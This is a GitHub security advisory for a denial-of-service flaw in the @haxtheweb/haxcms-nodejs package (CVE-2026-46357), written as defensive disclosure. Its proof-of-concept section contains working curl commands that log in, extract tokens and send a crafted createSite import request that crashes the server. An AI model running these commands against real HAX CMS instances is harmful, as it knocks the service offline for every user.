# [M] HAX CMS: Denial of Service using Malicious Import Request

## Summary
Severity: Medium
Advisory: GHSA-9r33-xhw8-4qqp
CVE: CVE-2026-46357
CWE: CWE-20, CWE-476
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-9r33-xhw8-4qqp
Type: github-advisory

## Affected
- npm: `@haxtheweb/haxcms-nodejs` — affected >=0 <26.0.0

## Details
### Summary

The HAX CMS NodeJS application crashes when an authenticated attacker sends a specially crafted site creation request to the createSite endpoint. A single request is sufficient to take the entire application offline, requiring a manual server restart to restore service.

### Details

The `createSite` remote import flow does **not** complete end-to-end. Instead, the server crashes before the outbound HTTP fetch happens.

The crash occurs because `createSite` passes a file object without `originalname`, while `HAXCMSFile.save()` immediately dereferences `tmpFile.originalname.replace(...)`.

As a result:

- the request reaches privileged code inside `createSite`
- the server hits the remote file handling path
- the process crashes before `downloadAndSaveFile()` performs the outbound request
- no imported file is written into the site directory

### Affected Resources

- src/routes/createSite.js:176
- src/lib/HAXCMSFile.js:25
- system/api/createSite

### PoC

1. Obtain a JWT by logging in with valid credentials.

```bash
JWT=$(curl -s -X POST 'http://127.0.0.1:3000/system/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}' | grep -o '"jwt":"[^"]*"' | head -1 | cut -d'"' -f4)
```

2. Extract the required tokens from the `connectionSettings` endpoint.

```bash
SETTINGS=$(curl -s 'http://127.0.0.1:3000/system/api/connectionSettings')
ROOT_TOKEN=$(printf '%s' "$SETTINGS" | grep -o '"token":"[^"]*"' | head -1 | cut -d'"' -f4)
USER_TOKEN=$(printf '%s' "$SETTINGS" | grep -o 'createSite[^"]*' | grep -o 'user_token=[^"&]*' | cut -d'=' -f2)
```

3. Send the malformed request to crash the server.

```bash
curl -i -X POST "http://127.0.0.1:3000/system/api/createSite?user_token=$USER_TOKEN&jwt=$JWT" \
  -H 'Content-Type: application/json' \
  -d "{
    \"token\": \"$ROOT_TOKEN\",
    \"site\": { \"name\": \"dos-poc\" },
    \"theme\": {},
    \"build\": {
      \"structure\": \"import\",
      \"type\": \"import\",
      \"items\": [],
      \"files\": {
        \"files/poc.txt\": \"http://127.0.0.1:8888/poc.txt\"
      }
    }
  }"
```

<img width="953" height="433" alt="Empty-Reply" src="https://github.com/user-attachments/assets/f3562726-2e64-4af6-a06c-8356dc7708da" />


The curl client receives an empty reply as the server crashes mid-request. The Node.js process terminates immediately with TypeError: Cannot read properties of undefined (reading 'replace') and nodemon reports the application as crashed.

<img width="950" height="278" alt="crash-detail" src="https://github.com/user-attachments/assets/1fbc80fb-4c2d-4bc6-af29-c3e9c45e8ad1" />


### Impact

An authenticated attacker can crash the HAX CMS NodeJS process with a single HTTP request, making the application unavailable to all users until the server is manually restarted. Since HAX CMS allows account registration, an attacker does not need to compromise existing credentials; they can create their own account and immediately use it to trigger the crash.

## References
- https://github.com/haxtheweb/issues/security/advisories/GHSA-9r33-xhw8-4qqp
- https://nvd.nist.gov/vuln/detail/CVE-2026-46357
- https://github.com/haxtheweb/issues
